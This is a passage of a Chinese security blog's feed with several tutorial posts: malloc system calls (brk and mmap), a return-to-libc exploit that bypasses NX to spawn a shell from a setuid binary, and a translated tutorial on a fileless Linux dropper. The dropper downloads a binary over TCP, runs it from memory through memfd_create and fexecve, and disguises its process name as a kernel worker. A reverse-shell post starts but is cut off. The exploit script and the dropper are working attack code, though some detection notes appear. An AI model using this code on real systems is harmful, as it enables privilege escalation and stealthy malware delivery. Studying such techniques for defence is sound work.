+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">/* sbrk and brk example */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        void *curr_brk, *tmp_brk = NULL;</div><div class="line"></div><div class="line">        printf(&quot;Welcome to sbrk example:%d\n&quot;, getpid());</div><div class="line"></div><div class="line">        /* sbrk(0) gives current program break location */</div><div class="line">        tmp_brk = curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program Break Location1:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        /* brk(addr) increments/decrements program break location */</div><div class="line">        brk(curr_brk+4096);</div><div class="line"></div><div class="line">        curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program break Location2:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        brk(tmp_brk);</div><div class="line"></div><div class="line">        curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program Break Location3:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>输出分析：</p>
+</li>
+<li>在brk之前，我们可以看到是没有进程中是没有堆块的，因此 start_brk=brk=end_data=0x602000<br><img src="/2018/03/18/malloc的系统调用/brkbefore.png" alt=""></li>
+<li>当程序执行brk调用的时候，如下的输出，我们看到有了堆块,因此 start_brk=end_data=0x602000,此时</li>
+<li>start_brk=end_data=0x602000</li>
+<li>brk = 0x603000<br><img src="/2018/03/18/malloc的系统调用/brkafter.png" alt=""></li>
+<li>解释一下新增加的一行：这里602000-603000就是动态分配的地址空间，对应的操作权限标志是rw-p即可读可写不可执行，私有的</li>
+<li>000000的文件偏移是因为没有映射任何的文件，00：00 是主要/次要的设备数-由于没有映射任何文件，所以这里也是0，最后的0是inode number，还是由于没有映射任何的文件，所以这里也还是0.<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4></li>
+<li><p>malloc使用<a href="https://elixir.bootlin.com/linux/v3.8/source/mm/mmap.c#L1285" target="_blank" rel="external">mmap</a>来创建一个私有的匿名映射块，私有的匿名映射块主要的目的就是分配新的内存。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">/* Private anonymous mapping example using mmap syscall */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">void static inline errExit(const char* msg)</div><div class="line">&#123;</div><div class="line">        printf(&quot;%s failed. Exiting the process\n&quot;, msg);</div><div class="line">        exit(-1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        int ret = -1;</div><div class="line">        printf(&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;, getpid());</div><div class="line">        printf(&quot;Before mmap\n&quot;);</div><div class="line">        getchar();</div><div class="line">        char* addr = NULL;</div><div class="line">        addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</div><div class="line">        if (addr == MAP_FAILED)</div><div class="line">                errExit(&quot;mmap&quot;);</div><div class="line">        printf(&quot;After mmap\n&quot;);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        /* Unmap mapped region. */</div><div class="line">        ret = munmap(addr, (size_t)132*1024);</div><div class="line">        if(ret == -1)</div><div class="line">                errExit(&quot;munmap&quot;);</div><div class="line">        printf(&quot;After munmap\n&quot;);</div><div class="line">        getchar();</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>输出分析：</p>
+</li>
+<li>在使用mmap之前：我们注意下面的一个内存地址段<br><img src="/2018/03/18/malloc的系统调用/mmapbefore.png" alt=""></li>
+<li>当我们通过mmap申请了132KB的空间的时候，看到如下图<br><img src="/2018/03/18/malloc的系统调用/mmapafter.png" alt=""><br>b7df0000-b7e12000 其中这段虚拟内存地址就包含了我们刚刚申请到132KB大小的地址空间</li>
+<li>其中b7df0000-b7e12000 是这个块的地址范围，对应的操作权限标志是rw-p即可读可写不可执行，私有的</li>
+<li>000000的文件偏移是因为没有映射任何的文件，00：00 是主要/次要的设备数-由于没有映射任何文件，所以这里也是0，最后的0是inode number，还是由于没有映射任何的文件，所以这里也还是0.</li>
+<li>当munmap之后，下面的输出我们可以看的到申请的内存被释放（变成原来的b7e11000-b7e12000），又交还给了操作系统。<br><img src="/2018/03/18/malloc的系统调用/aftermunmap.png" alt=""><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
+<li>在64位上brk和32的结果是相同的，但是mmap的会有不同，原因暂时不明。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li>
+<li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">Syscalls used by malloc.</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;在读这篇文章的时候你应该知道c语言的malloc是使用系统调用从操作系统申请内存的，这两个系统调用分别是
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>通过return-to-libc绕过NX-bit</title>
+    <link href="http://kevien.github.io/2018/02/26/%E9%80%9A%E8%BF%87return-to-libc%E7%BB%95%E8%BF%87NX-bit/"/>
+    <id>http://kevien.github.io/2018/02/26/通过return-to-libc绕过NX-bit/</id>
+    <published>2018-02-26T15:13:31.000Z</published>
+    <updated>2018-02-26T15:39:45.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
+<li>读此文章之前建议先读一下这篇文章<a href="https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">linux栈溢出学习笔记</a></li>
+<li>本次的测试环境是ubuntu14.04（X86).</li>
+<li>为了缓解攻击者的行为，专家们想出了一项缓解缓冲区溢出漏洞利用的措施叫做“NX Bit”.</li>
+<li>什么是NX(No-eXecute) Bit，<a href="https://www.wikiwand.com/en/NX_bit" target="_blank" rel="external">wiki</a>,它是一项让某个特定区域的内存代码变得不可执行不可修改的技术，例如，数据区域、栈空间和堆空间是不可执行的，代码区是不可写入的。当NX bit开启的时候，我们之前的缓冲区溢出利用将会失败，因为我们之前的shellcode会被复制到栈中然后我们的返回地址会被指向我们的shellcode从而执行我们的shellcode，但是自从栈中的代码不可以执行之后，我们的exploit会失败，但是这种缓解措施并不是一劳永逸的，因此这篇文章将介绍如何绕过NX Bit！<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> //vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char* argv[]) &#123;</div><div class="line"> char buf[256]; /* [1] */ </div><div class="line"> strcpy(buf,argv[1]); /* [2] */</div><div class="line"> printf(&quot;%s\n&quot;,buf); /* [3] */</div><div class="line"> fflush(stdout);  /* [4] */</div><div class="line"> return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</div><div class="line">$gcc -g -fno-stack-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<ul>
+<li>需要注意的是 当参数-z execstack 没有传入（默认没有）的时候，我们的NX bit是没有开起来的<br>我们可以通过readelf -l 命令来查看一下<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/readelf.png" alt=""></li>
+<li>可以看到栈空间只有RW的标志而没有E的标志。<h4 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h4></li>
+<li>攻击者可以使用“return-to-libc”的技巧来绕过NX bit，这里返回地址被一个特定的libc的函数地址所覆盖（而不是包含shellcode的栈空间地址），例如如果攻击者想要去得到一个shell，他可以使用system（）函数的地址去覆盖返回函数的地址，同时在栈中设置system需要的合适参数来供其成功的调用。</li>
+<li><p>漏洞利用代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. </div><div class="line">#For example system address = libc base address + system offset</div><div class="line">#where </div><div class="line">       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)</div><div class="line">       #system offset     = 0x0003f060 (obtained from &quot;readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system&quot;)</div><div class="line"></div><div class="line">system = 0xb7e52310       #0xb7e2000+0x0003f060</div><div class="line">exit = 0xb7e45260          #0xb7e2000+0x00032be0</div><div class="line"></div><div class="line">#system_arg points to &apos;sh&apos; substring of &apos;fflush&apos; string. </div><div class="line">#To spawn a shell, system argument should be &apos;sh&apos; and hence this is the reason for adding line [4] in vuln.c. </div><div class="line">#But incase there is0xb754b260 no &apos;sh&apos; in vulnerable binary, we can take the other approach of pushing &apos;sh&apos; string at the end of user input!!</div><div class="line">system_arg = 0xb7ffee11     #(obtained from hexdump output of the binary)</div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack(&quot;&lt;I&quot;,num)</div><div class="line">buf = &quot;A&quot; * 268</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print &quot;Calling vulnerable program&quot;</div><div class="line">call([&quot;./vuln&quot;, buf])</div></pre></td></tr></table></figure>
+</li>
+<li><p>关于system和exit以及sh的查找可以使用如下的方法<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/findaddr.png" alt=""></p>
+</li>
+<li>最后执行上面的利用代码可以得到我们想要的shell，如下图<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/exp.png" alt=""><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/" target="_blank" rel="external">Bypassing NX bit using return-to-libc</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;读此文章之前建议先读一下这篇文章&lt;a href=&quot;https://kevien.github.io/2017/08/16/lin
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>linux一种无文件后门技巧(译文)</title>
+    <link href="http://kevien.github.io/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7(%E8%AF%91%E6%96%87)/"/>
+    <id>http://kevien.github.io/2018/02/20/linux一种无文件后门技巧(译文)/</id>
+    <published>2018-02-20T03:51:50.000Z</published>
+    <updated>2018-07-22T03:05:19.848Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">原文链接：&lt;https://0x00sec.org/t/super-stealthy-droppers/3715&gt;</div></pre></td></tr></table></figure>
+<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li><p>几周之前我看了这篇<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="external">文章</a>,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里<a href="https://kevien.github.io/2018/01/28/linux进程注入/">linux进程注入</a>)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The current payload in use is a simple open/memfd_create/sendfile/fexecve program</div></pre></td></tr></table></figure>
+</li>
+<li><p>我之前没有听过memfd_create和fexecve…就是这里引发了我的好奇，我决定学习和研究一下。</p>
+</li>
+<li>这篇文章我们将要讨论一下怎么利用这两个函数来开发一个超级隐蔽的dropper，你可以认为这是一个恶意软件开发的教程，但是开发和发布恶意软件是违法的：），此文仅做教学使用，因为最终恶意软件分析师需要去了解恶意软件开发者是怎么利用的，好让我们能更好的去检测它，从而使我们的系统更加安全。<h4 id="memfd-create-和-fexecve"><a href="#memfd-create-和-fexecve" class="headerlink" title="memfd_create 和 fexecve"></a>memfd_create 和 fexecve</h4></li>
+<li>当读完这句有意思的话之后，我google了这两个函数，我发现功能确实强大，第一个允许我们在内存中创建一个文件，我们之前讨论过这个<a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" target="_blank" rel="external">话题</a>,之前我们是使用/dev/shm来存放的文件，这个文件夹存放在内存中，我们写在这里的东西都不会保存到硬盘上，然而，我们还是可以通过ls看到它。</li>
+<li>memfd_create 能做同样的事情，但是它在内存中的存储并不会被映射到文件系统中，因此不能简单的通过ls命令进行查看。</li>
+<li>第二个函数，fexecve同样的功能很强大，它能使我们执行一个程序（同execve），但是传递给这个函数的是文件描述符，而不是文件的绝对路径，也就是说搭配起来memfd_create使用简直完美！</li>
+<li>但是这里有一个需要注意的地方就是，因为这两个函数相对的比较新，memfd_create 是在kernel3.17才被引进来，fexecve是libc的一个函数，是在版本2.3.2之后才有的，当然没有fexecve的时候，我们也可以使用其它方式去取代它（后面会讨论），而memfd_create只能用在相对较新的linux内核系统上。</li>
+<li>这意味着至少在现在，这个技巧在一些运行着老内核和没有libc的嵌入式设备上是不可行的，我没有测试一些路由器和安卓设备上是否存在fexecve函数，我觉得是没有的，如有人知道，请在评论处告知；）<h4 id="一个简单的dropper"><a href="#一个简单的dropper" class="headerlink" title="一个简单的dropper"></a>一个简单的dropper</h4></li>
+<li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存储在磁盘上。</li>
+<li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="external">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>我们将要创建一个新的.s,一旦执行，将会达到执行类型上面一行shell同样的效果。</p>
+<ul>
+<li><p>让我们先来看一下这个代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"></div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">#define __NR_memfd_create 319</div><div class="line">#define MFD_CLOEXEC 1</div><div class="line"></div><div class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</div><div class="line">    return syscall(__NR_memfd_create, name, flags);</div><div class="line">&#125;</div><div class="line"></div><div class="line">extern char        **environ;</div><div class="line"></div><div class="line">int main (int argc, char **argv) &#123;</div><div class="line">  int                fd, s;</div><div class="line">  unsigned long      addr = 0x0100007f11110002;</div><div class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</div><div class="line">  char               buf[1024];</div><div class="line"></div><div class="line">  // Connect</div><div class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</div><div class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</div><div class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  while (1) &#123;</div><div class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</div><div class="line">      write (fd, buf, 1024);</div><div class="line">    &#125;</div><div class="line">  close (s);</div><div class="line">  </div><div class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  return 0;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>代码很短也很简单，但是这里有几个点需要稍微介绍一下。</p>
+<h4 id="调用memfd-create"><a href="#调用memfd-create" class="headerlink" title="调用memfd_create"></a>调用memfd_create</h4></li>
+<li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="external">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li>
+<li>首先我们需要找到memfd_create在系统调用中的索引，通过一些在线的系统调用表，这个索引在不同的架构下是不同的，如果你想将上面的代码应用在ARM和MIPS上,可能需要不同的索引，在X86_64系统架构下的索引是319.</li>
+<li>我使用了libc的syscall去对memfd_create进行了封装。</li>
+<li>这个程序主要做了下面的事情</li>
+<li>1.创建了一个TCP socket</li>
+<li><p>2，使用AF_INET连接了127.0.0.1的0x1111端口，我们可以把这些所有的打包到一个变量里面这样可以使我们的代码看起来更短一点儿，同样你也可以去修改成你想要的ip和端口。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">addr = 01 00 00  7f   1111  0002;</div><div class="line">        1. 0. 0.127   1111  0002;</div><div class="line">       +------------+------+----</div><div class="line">         IP Address | Port | Family</div></pre></td></tr></table></figure>
+</li>
+<li><p>3.创建一个内存文件</p>
+</li>
+<li>4.从socket读取数据写入到内存文件</li>
+<li>5.一旦文件传输完毕，运行内存文件</li>
+<li>是不是很简单粗暴；）<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4></li>
+<li>现在，让我们来测试一下，通过main函数里面那个long的变量我们知道，这个dropper将会去连接本地localhost(127.0.0.1)的0x1111端口，这里我们简单的使用nc模拟一个server。</li>
+<li><p>在控制台我们运行下面的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat /usr/bin/xeyes | nc -l $((0x1111))</div></pre></td></tr></table></figure>
+</li>
+<li><p>你可以选择任意你喜欢的二进制文件，我这里用的是xeyes（一个小眼睛会跟踪鼠标的移动）这个linux自带的小程序。在另外的一个命令行界面我们运行我们的dropper，这个时候xeyes会弹出来。<br><img src="/2018/02/20/linux一种无文件后门技巧(译文)/xeye.png" alt=""></p>
+<h4 id="检测这个dropper"><a href="#检测这个dropper" class="headerlink" title="检测这个dropper"></a>检测这个dropper</h4></li>
+<li><p>查找这个进程比较困难，因为我们给这个进程起了一个kworker/u!0这样的名字，注意！在这里只是为了快速的去发现它，当然在实际情况中，你可以使用一个具有迷惑性的名字，比如说什么so的进程名来让它看起来像是个内核的合法进程，让我们来看一下ps的输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ ps axe</div><div class="line">(...)</div><div class="line"> 2126 ?        S      0:00 [kworker/0:0]</div><div class="line"> 2214 pts/0    S+     0:00 [kworker/u!0]</div><div class="line">(...)</div></pre></td></tr></table></figure>
+</li>
+<li><p>你可以看到上面的一行中是一个合法的kworker进程，下面的就是我们的看似合法的进程。</p>
+<h4 id="看不见的文件"><a href="#看不见的文件" class="headerlink" title="看不见的文件"></a>看不见的文件</h4></li>
+<li>我们之前提到的memfd_create 将会在RAM文件系统中创建文件且不会映射到一般的文件系统，至少，如果映射了，我是没找到，所以现在看来这的确是相当隐蔽的。</li>
+<li>然而，事实上，如果一个文件存在，那么我们还是可以去发现它的，谁会去调用这个文件呢，没错，我们可以通过lsof(list of file)去查找：）到它<br><img src="/2018/02/20/linux一种无文件后门技巧(译文)/lsof.png" alt=""></li>
+<li>注意lsof同样可以会显示出进程id，所以我们之前用的伪装的进程名在这个时候也就没有用了。<h4 id="如果系统中没有memfd-open不存在呢"><a href="#如果系统中没有memfd-open不存在呢" class="headerlink" title="如果系统中没有memfd_open不存在呢"></a>如果系统中没有memfd_open不存在呢</h4></li>
+<li>我之前提到过memfd_open只是存在于内核在3.17或者更高的版本中，那在其它的版本中该怎么办，这种情况下我们可以使用另外一种没那么猥琐但是可以达到同样效果的方法。</li>
+<li>我们最好的方式是使用shm_open(shared memory open)，这个函数会在/dev/shm文件夹下创建文件，然而，这个使用ls命令是可以看的到的，但是至少还是避免了写文件到磁盘了，shm_open和open的区别仅仅是不是在/dev/shm创建文件。</li>
+<li>使用shm_open去修改这个dropper我们需要去做两件事情</li>
+<li><p>1.首先我们需要去使用shm_open去代替memfd_create像是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">if ((fd = shm_open(&quot;a&quot;, O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
+</li>
+<li><p>2.第二件事情就是我们需要关闭这个文件，然后去重新打开是为了能够通过fexecve去执行它，所以在while接收完文件之后我们需要关闭文件，然后重启新开文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">  close (fd);</div><div class="line"></div><div class="line">  if ((fd = shm_open(&quot;a&quot;, O_RDONLY, 0)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
+</li>
+<li><p>然而，主要注意的是，这个时候我们完全可以使用execve去替代fexecve去达到同样的效果。</p>
+<h4 id="那如果fexecve不存在呢"><a href="#那如果fexecve不存在呢" class="headerlink" title="那如果fexecve不存在呢"></a>那如果fexecve不存在呢</h4></li>
+<li><p>当你知道fexecve是怎么工作的，这个就很简单，怎么去知道这个函数是怎么工作的，google一下看看源代码，man page有一个提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NOTES</div><div class="line">On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.</div></pre></td></tr></table></figure>
+</li>
+<li><p>所以fexecve需要系统存在/proc的目录。让我们看看能不能自己实现一下。我们知道每个进程在虚拟目录proc下都有一个数字文件目录与之相对，所以这个时候，我们可以基本上使用下面的封装函数来实现fexecve的功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int</div><div class="line">my_fexecve (int fd, char **arg, char **env) &#123;</div><div class="line">  char  fname[1024];</div><div class="line"></div><div class="line">  snprintf (fname, 1024, &quot;/proc/%d/fd/%d&quot;, getpid(), fd);</div><div class="line">  execve (fname, arg, env);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
+<li>读完这篇文章，你应该了解了之前提到的open/memfdcreate/sendfile/fexecve这几个函数。</li>
+<li>这篇文章中作者是以打开xeye程序为示例，还有其它猥琐的利用场景吗？<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li><a href="https://0x00sec.org/t/super-stealthy-droppers/3715" target="_blank" rel="external">Super-Stealthy Droppers</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;lin
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>reverse shell的几种方式</title>
+    <link href="http://kevien.github.io/2018/01/30/reverse-shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
+    <id>http://kevien.github.io/2018/01/30/reverse-shell的几种方式/</id>
+    <published>2018-01-30T07:58:01.000Z</published>
+    <updated>2018-02-04T10:27:43.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
+<li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。</li>
+<li>linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。</li>
+<li>下文中的几个例子一般在大多数的系统中是通用的。</li>
+<li>这里主要重点关注一下4和5<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4></li>
+<li>要求能够使用者能够在目标机器上运行一些基本的命令。<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
+<li>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2></li>
+</ul>
